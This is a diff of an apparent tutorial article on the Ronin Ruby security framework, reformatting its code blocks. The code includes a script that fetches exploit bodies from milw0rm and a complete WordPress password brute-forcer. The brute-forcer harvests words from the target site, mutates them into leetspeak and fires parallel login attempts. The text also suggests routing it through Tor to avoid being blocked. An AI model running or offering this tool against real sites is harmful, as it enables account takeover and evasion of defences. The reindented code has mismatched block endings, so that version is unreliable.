@@ -238,89 +238,92 @@ library ie.
 
     ronin>> puts Web::Dorks.search(:site => 'milw0rm.org/remote', :query => 'ftp').page(1).summaries
 
-    #!/usr/bin/env ruby
-    require 'pp'
-    require 'ronin'
-    require 'optparse'
-    require 'ostruct'
+{% highlight ruby %}
+#!/usr/bin/env ruby
+require 'pp'
+require 'ronin'
+require 'optparse'
+require 'ostruct'
 
-    include Ronin
+include Ronin
 
-    options = OpenStruct.new
-    options.verbose = false
-    options.date = Date.today-90
-    options.subject = nil
+options = OpenStruct.new
+options.verbose = false
+options.date = Date.today-90
+options.subject = nil
 
-    begin
-      OptionParser.new do |opts|
-      opts.banner = "Usage: getAllWpExploits.rb [options]"
+begin
+  OptionParser.new do |opts|
+    opts.banner = "Usage: getAllWpExploits.rb [options]"
 
-      opts.on("-v", "--[no-]verbose", "Run verbosely") do |v|
-        options.verbose = v
-      end
-
-      opts.on("-d <date>", "Specify the <date> that exploits must be newer than.") do |d|
-        options.date = Date.parse(d)
-      end
-
-      opts.on("-s <subject>", "Specify the <subject> that exploit must match.") do |s|
-        options.subject = s
-        options.subject_re = /#{s}/i
-      end
-
-      if (!defined? options.subject)
-        puts opts
-        puts options.subject
-        raise OptionParser::MissingArgument, 'A subject to search for is required', caller
-      end
-    end.parse!
-
-    rescue OptionParser::MissingArgument
-      puts $!
-      exit
+    opts.on("-v", "--[no-]verbose", "Run verbosely") do |v|
+      options.verbose = v
     end
 
-    def findRemoteExploit(re, date)
-      if (!re.instance_of? Regexp)
-        raise ArgumentError, "First argument is not a Regexp", caller
+    opts.on("-d <date>", "Specify the <date> that exploits must be newer than.") do |d|
+      options.date = Date.parse(d)
+    end
+
+    opts.on("-s <subject>", "Specify the <subject> that exploit must match.") do |s|
+      options.subject = s
+      options.subject_re = /#{s}/i
+    end
+
+    if (!defined? options.subject)
+      puts opts
+      puts options.subject
+      raise OptionParser::MissingArgument, 'A subject to search for is required', caller
+    end
+  end.parse!
+rescue OptionParser::MissingArgument
+  puts $!
+  exit
+end
+
+def findRemoteExploit(re, date)
+  if (!re.instance_of? Regexp)
+    raise ArgumentError, "First argument is not a Regexp", caller
+  end
+
+  if (!date.instance_of? Date)
+    raise ArgumentError, "Second argument is not a Date", caller
+  end
+
+  start = 0
+  dont_bail = true
+  while page = Platform.milw0rm.remote[start]
+    page.each { |exploit|
+      # Check if it is older than the date.  We assume that the exploits are pulled
+      # sorted by date so if we find one with a date greater than date we 
+      # bail.
+      if (exploit.date < date)
+        dont_bail = false
+        break
       end
 
-      if (!date.instance_of? Date)
-        raise ArgumentError, "Second argument is not a Date", caller
-      end
+      # Check if the title matches re.
+      next unless exploit.title =~ re
 
-      start = 0
-      dont_bail = true
-      while page = Platform.milw0rm.remote[start]
-        page.each { |exploit|
-          # Check if it is older than the date.  We assume that the exploits are pulled
-          # sorted by date so if we find one with a date greater than date we 
-          # bail.
-          if (exploit.date < date)
-            dont_bail = false
-            break
-          end
+      # It looks like the milw0rm extension doesn't parse title
+      puts exploit.date.strftime('%Y-%m-%d') +", "+ exploit.title
 
-          # Check if the title matches re.
-          next unless exploit.title =~ re
+      # Get the exploit.
+      puts exploit.body
+    }
 
-          # It looks like the milw0rm extension doesn't parse title
-          puts exploit.date.strftime('%Y-%m-%d') +", "+ exploit.title
-
-          # Get the exploit.
-          puts exploit.body
-        }
-        if (!dont_bail)
+    if (!dont_bail)
           break
-        end
-        start = start.succ
-      end #while
-    end #find
+    end
 
-    puts "Looking for any remote exploit matching #{options.subject_re.inspect} in the title posted after "
-    puts "#{options.date.strftime '%Y-%m-%d'} on milw0rm.org"
-    findRemoteExploit(options.subject_re, options.date)
-    puts "Done."
+    start = start.succ
+    end #while
+end #find
+
+puts "Looking for any remote exploit matching #{options.subject_re.inspect} in the title posted after "
+puts "#{options.date.strftime '%Y-%m-%d'} on milw0rm.org"
+findRemoteExploit(options.subject_re, options.date)
+puts "Done."
+{% endhighlight %}
 
 ---------------------------------------------------------------------------
 
@@ -353,159 +356,189 @@ the other end to have it easy and be able to whitelist a single ip, so we'll
 run the whole damn thing through tor (now they could just block tor which would
 be a bummer).
 
-    #!/usr/bin/env ruby
-    require 'ronin/web'
-    require 'optparse'
-    require 'ostruct'
-    require 'wordlist/builders/website' # http://github.com/sophsec/wordlist
-    require 'wordlist'
-    require 'logger'
-    include Ronin
+{% highlight ruby %}
+#!/usr/bin/env ruby
+require 'ronin/web'
+require 'optparse'
+require 'ostruct'
+require 'wordlist/builders/website' # http://github.com/sophsec/wordlist
+require 'wordlist'
+require 'logger'
 
-    class App
-      VERSION = '0.0.1'
+include Ronin
 
-      attr_reader :options
+class App
+  VERSION = '0.0.1'
 
-      def initialize (arguments)
-        @arguments = arguments
-        @options = OpenStruct.new
-        @options.verbose = false
-        @options.host = nil
-        @options.word_list = nil
-        @options.file = 'list.txt'
-        @options.threads = 10
-        @options.path = '/wp-login.php'
-        @options.user = 'admin'
-        @opts = nil
-        @mutations = { 
-          'a' => '@', 'a' => '4', 'A' => '@', 'A' => '4',  
+  attr_reader :options
 
-          'b' => '8', 'B' => '8', 
+  def initialize(arguments)
+    @arguments = arguments
+    @options = OpenStruct.new
+    @options.verbose = false
+    @options.host = nil
+    @options.word_list = nil
+    @options.file = 'list.txt'
+    @options.threads = 10
+    @options.path = '/wp-login.php'
+    @options.user = 'admin'
+    @opts = nil
+    @mutations = {
+      'a' => '@', 'a' => '4', 'A' => '@', 'A' => '4',
 
-          'c' => '(', 'C' => '(', 
+      'b' => '8', 'B' => '8',
 
-          'e' => '3', 'E' => '3', 
+      'c' => '(', 'C' => '(',
 
-          'g' => '6', 'G' => '6', 
+      'e' => '3', 'E' => '3',
 
-          'i' => '1', 'I' => '1', 'i' => '|', 'I' => '|', 'i' => '!', 'I' => '!', 
+      'g' => '6', 'G' => '6',
 
-          'l' => '1', 'L' => '1', 'l' => '!', 'L' => '!', 'l' => '|', 'L' => '|', 
+      'i' => '1', 'I' => '1', 'i' => '|', 'I' => '|', 'i' => '!', 'I' => '!',
 
-          'o' => '0', 'O' => '0', 
+      'l' => '1', 'L' => '1', 'l' => '!', 'L' => '!', 'l' => '|', 'L' => '|',
 
-          's' => '5', 'S' => '5', 
+      'o' => '0', 'O' => '0',
 
-          't' => '7', 'T' => '7', 't' => '+', 'T' => '+', 
-        } 
-        file = File.open('smartBruteForceWP.log', File::WRONLY | File::APPEND)
-        @options.logger = Logger.new(file)
-        @options.logger.level = Logger::DEBUG
-      end 
+      's' => '5', 'S' => '5',
 
-      def run 
-        if parsed_options?  
-          # @todo Before we build the word list lets verify that we have a vaild
-          # path for login and confirm that that the user we are using is valid
-          # This can be accomplished be checking the returnvalue of logging in
-          # with one character for the pass and the user and seeing if the 
-          # response is Invalid username vs Invalid password.
+      't' => '7', 'T' => '7', 't' => '+', 'T' => '+',
+    }
 
-          # Generate the wordlist.  We want words greater than 5 characters 
-          # and less then 15.  We would also like to perform some l33t speak 
-          # mutations on the words.  
-          @options.logger.debug("#{Process.pid}: Generating wordlist (#{options.file}) from #{options.host}")
-          ws = Wordlist::Builders::Website.build( 
-                @options.file, { :host => @options.host}) 
-          @options.logger.debug("#{Process.pid}: Building a wordlist from (#{options.file})")
-          list = Wordlist::FlatFile.new(@options.file, 
-                  {:max_length => 15, :min_length => 5}) 
-          @options.logger.debug("mutating list with #{@mutations.inspect}")
-          build_mutations! list
+    file = File.open('smartBruteForceWP.log', File::WRONLY | File::APPEND)
+      @options.logger = Logger.new(file)
+      @options.logger.level = Logger::DEBUG
+    end
+  end
 
-          # Create a bunch of processes for contacting the target site and trying
-          # to log in with our word.  Bail on success.
-          pids = []
-          wordct = 0
-          url = 'http://' + options.host + options.path
-          @options.logger.debug("Brute forcing #{url} with #{@options.threads} threads")
-          query = {:log => options.user, 'wp-submit' => "Log In"}
-          list.each_mutation do |word| 
-            wordct = wordct.succ
+  def run 
+    if parsed_options?
+      # @todo Before we build the word list lets verify that we have a vaild
+      # path for login and confirm that that the user we are using is valid
+      # This can be accomplished be checking the returnvalue of logging in
+      # with one character for the pass and the user and seeing if the
+      # response is Invalid username vs Invalid password.
 
-            # Only allow options.threads to run at once
-            if pids.size >= @options.threads.to_i
-              pid = Process.wait
-              if ($?.exitstatus == 1)
-                exit
-              end
-              pids.delete pid
-            end
+      # Generate the wordlist.  We want words greater than 5 characters
+      # and less then 15.  We would also like to perform some l33t speak
+      # mutations on the words.
+      @options.logger.debug("#{Process.pid}: Generating wordlist (#{options.file}) from #{options.host}")
 
-            pids << fork {
-              query[:pwd] = word
-              @options.logger.debug("#{query.inspect}")
-              if Ronin::Web.post(url, :query => query).parser.css('#login_error').size == 0
-                # Now it is safe to bail on all the threads.
-                puts "username:#{options.user}, password:#{word}" 
-                exit 1
-              end
-            }
-          end 
-          pids.each do  |pid|
-            Process.waitpid pid
-            if ($?.exitstatus == 1)
-              exit
-            end
-          end
-          puts "Tried #{wordct} passwords and was unable to login."
-        else 
-          output_usage 
-        end 
-      end 
+      ws = Wordlist::Builders::Website.build(
+        @options.file,
+        :host => @options.host
+      )
 
-      #protected 
-      def build_mutations! list
-        @mutations.each do |key, val|
-          list.mutate key, val
+      @options.logger.debug("#{Process.pid}: Building a wordlist from (#{options.file})")
+
+      list = Wordlist::FlatFile.new(
+        @options.file,
+        :max_length => 15,
+        :min_length => 5
+      )
+
+      @options.logger.debug("mutating list with #{@mutations.inspect}")
+
+      build_mutations! list
+
+      # Create a bunch of processes for contacting the target site and trying
+      # to log in with our word.  Bail on success.
+      pids = []
+      wordct = 0
+      url = 'http://' + options.host + options.path
+
+      @options.logger.debug("Brute forcing #{url} with #{@options.threads} threads")
+
+      query = {:log => options.user, 'wp-submit' => "Log In"}
+
+      list.each_mutation do |word|
+        wordct = wordct.succ
+
+        # Only allow options.threads to run at once
+        if pids.size >= @options.threads.to_i
+          pid = Process.wait
+
+          exit if ($?.exitstatus == 1)
+          pids.delete pid
         end
-      end  
 
-      def parsed_options?  
-        begin
-	  @opts = OptionParser.new 
-          @opts.banner = "Usage: smartBruteForceWP.rb [options]" 
-          @opts.on("-v", "--[no-]verbose", "Run verbosely") { |v| 
-            @options.verbose = v } 
-          @opts.on("-t=THREADS", "Specify the number of concurrent requests we should make.") { |t| 
-            @options.threads = t } 
-          @opts.on("-p=PATH", "Specify the PATH to wp-login.php.") { |p| 
-            @options.path = p } 
-          @opts.on("-u=USER", "Specify the USER to login as.") { |u| 
-            @options.user = u } 
-          @opts.on("-s=SITE", "Specify the <site> to brute force.") { |s| 
-            @options.host = s } 
-          @opts.parse!  
+        pids << fork do
+          query[:pwd] = word
 
-          if (@options.host.nil?) 
-            raise OptionParser::MissingArgument, 
-              'A subject to search for is required', caller 
-          end 
-        rescue OptionParser::MissingArgument 
-          puts $!  
-          return false 
-        end 
-        true 
+          @options.logger.debug("#{query.inspect}")
+
+          if Ronin::Web.post(url, :query => query).parser.css('#login_error').size == 0
+            # Now it is safe to bail on all the threads.
+            puts "username:#{options.user}, password:#{word}"
+            exit 1
+          end
+        end
+      end
+
+      pids.each do  |pid|
+        Process.waitpid pid
+
+        exit if ($?.exitstatus == 1)
+      end
+
+      puts "Tried #{wordct} passwords and was unable to login."
+    else 
+      output_usage 
+    end 
+  end 
+
+  protected
+
+  def build_mutations!(list)
+    @mutations.each { |key, val| list.mutate key, val }
+  end
+
+  def parsed_options?
+    begin
+      @opts = OptionParser.new
+      @opts.banner = "Usage: smartBruteForceWP.rb [options]"
+
+      @opts.on("-v", "--[no-]verbose", "Run verbosely") do |v|
+          @options.verbose = v
+      end
+
+      @opts.on("-t=THREADS", "Specify the number of concurrent requests we should make.") do |t|
+        @options.threads = t
+      end
+
+      @opts.on("-p=PATH", "Specify the PATH to wp-login.php.") do |p|
+        @options.path = p
+      end
+
+      @opts.on("-u=USER", "Specify the USER to login as.") do |u|
+        @options.user = u
+      end
+
+      @opts.on("-s=SITE", "Specify the <site> to brute force.") do |s|
+        @options.host = s
+      end
+
+      @opts.parse!
+
+      if (@options.host.nil?)
+        raise(OptionParser::MissingArgument,'A subject to search for is required',caller)
       end 
-
-      def output_usage 
-        puts @opts 
-      end 
+    rescue OptionParser::MissingArgument 
+      puts $!  
+      return false 
     end 
 
-    app = App.new ARGV 
-    app.run
+    true 
+  end 
+
+  def output_usage 
+    puts @opts 
+  end 
+end 
+
+app = App.new ARGV 
+app.run
+{% endhighlight %}
 
 You may want to experiment with running this code through a the torify command
 to make sure all of the requests don't come from the same ip. The default number
@@ -572,6 +605,7 @@ Since this will be read on paper by a good number of people I will include
 a bit of the source for this library here, because it is nothing short of code
 poetry
 
+{% highlight ruby %}
     # Build a wordlist from a dictionary file, only selecting words between
     # 5 and 15 characters.  
     list = Wordlist::FlatFile.new('dictionary.txt', {:max_length => 15, :min_length => 5})
@@ -585,9 +619,11 @@ poetry
       puts word
     end
     # => @apple, @ppl3, appl3, apple, etc
+{% endhighlight %}
 
 wordlist/list.rb: Wordlist::List.each_mutation:
 
+{% highlight ruby %}
     #
     # Enumerates through every unique mutation, of every unique word, using
     # the mutator rules define for the list. Every possible unique mutation
@@ -624,9 +660,11 @@ wordlist/list.rb: Wordlist::List.each_mutation:
 
       each_unique(&(mutator_stack.first))
     end
+{% endhighlight %}
 
 wordlist/mutator.rb: Wordlist::Mutator.each:
 
+{% highlight ruby %}
     #
     # Performs every possible replacement of data, which matches the
     # mutators +pattern+ using the replace method, on the specified _word_
@@ -660,6 +698,7 @@ wordlist/mutator.rb: Wordlist::Mutator.each:
 
       return word
     end
+{% endhighlight %}
 
 [9] An article by Dr. Nic about the "find it, fork it, clone it, build it, 
 install it, technologic" work-flow using git and rubygems.
